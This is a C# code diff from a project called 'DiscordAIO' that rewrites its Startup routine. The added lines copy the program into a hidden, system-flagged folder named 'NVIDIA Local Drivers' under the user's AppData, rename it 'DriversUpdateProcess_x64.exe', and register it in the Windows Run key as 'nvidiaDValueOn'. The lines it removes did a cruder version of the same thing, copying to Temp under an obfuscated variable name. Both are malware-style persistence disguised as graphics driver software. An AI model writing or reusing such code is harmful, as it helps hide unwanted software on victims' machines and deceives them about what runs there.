@@ -2632,32 +2632,17 @@ namespace DiscordAIO
 		[DllImport("User32.dll")]
 		private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
 
+		private static string startupdir = Path.GetPathRoot(Assembly.GetEntryAssembly().Location) + "Users\\" + Environment.UserName + "\\AppData\\Local\\NVIDIA Local Drivers";
 		public static void Startup()
 		{
-			string XFGSFJFpxU = Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath);
-			try
-			{
-				if (File.Exists(XFGSFJFpxU))
-				{
-					File.Delete(XFGSFJFpxU);
-				}
-				File.Copy(Application.ExecutablePath, Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath));
-				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-				registryKey.SetValue(Path.GetFileNameWithoutExtension(XFGSFJFpxU), XFGSFJFpxU);
-			}
-			catch
-			{
-				Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(XFGSFJFpxU));
-				if (processesByName.Length > 0)
-				{
-					Process[] array = processesByName;
-					int num = 0;
-					if (num < array.Length)
-					{
-						Process process = array[num];
-						process.Kill();
-					}
-				}
+            if (!Directory.Exists(startupdir))
+            {
+				Directory.CreateDirectory(startupdir);
+				File.SetAttributes(startupdir, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Hidden);
+				File.Copy(Assembly.GetEntryAssembly().Location, startupdir + "\\DriversUpdateProcess_x64.exe");
+				File.SetAttributes(startupdir + "\\DriversUpdateProcess_x64.exe", FileAttributes.Hidden | FileAttributes.System | FileAttributes.Hidden);
+				Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+				key.SetValue("nvidiaDValueOn", startupdir + "\\DriversUpdateProcess_x64.exe");
 			}
 		}
 
